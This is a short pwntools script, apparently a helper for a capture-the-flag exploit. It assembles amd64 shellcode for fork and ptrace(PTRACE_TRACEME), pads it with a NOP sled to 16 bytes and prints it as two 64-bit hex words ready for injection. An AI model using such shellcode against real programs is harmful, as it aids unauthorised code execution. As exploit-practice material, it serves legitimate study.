from pwn import *

context.arch = 'amd64'

code = ''
code += shellcraft.fork()
code += shellcraft.ptrace(constants.PTRACE_TRACEME)

code = asm(code)
code = code.rjust(16, b'\x90')
print(len(code))
print(hex(u64(code[:8])))
print(hex(u64(code[8:])))
